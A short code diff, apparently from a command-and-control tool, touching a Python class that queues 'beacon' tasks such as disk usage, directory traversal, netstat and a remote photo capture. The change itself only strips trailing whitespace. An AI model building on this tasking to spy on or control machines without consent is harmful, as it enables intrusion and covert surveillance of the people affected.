@@ -71,7 +71,7 @@ class BeaconCommandsClass:
     def disk_usage(self, userID) -> None:
         add_beacon_command_list(userID, None, "disk_usage", "")
         return
-    
+
     def dir_traversal(self, userID) -> None:
         add_beacon_command_list(userID, None, "directory_traversal", "")
         return
@@ -79,7 +79,7 @@ class BeaconCommandsClass:
     def netstat(self, userID) -> None:
         add_beacon_command_list(userID, None, "netstat", "")
         return
-    
+
     def takePhoto(self, userID) -> None:
         add_beacon_command_list(userID, None, "snap", "")
         return
@@ -93,7 +93,7 @@ class BeaconCommandsClass:
                     beacon_commands.command_output
                     else "Awaiting Response"}""")
         return
-    
+
     def beacon_configueration(self, userID) -> None:
         data = {}
         additional_data = "y"
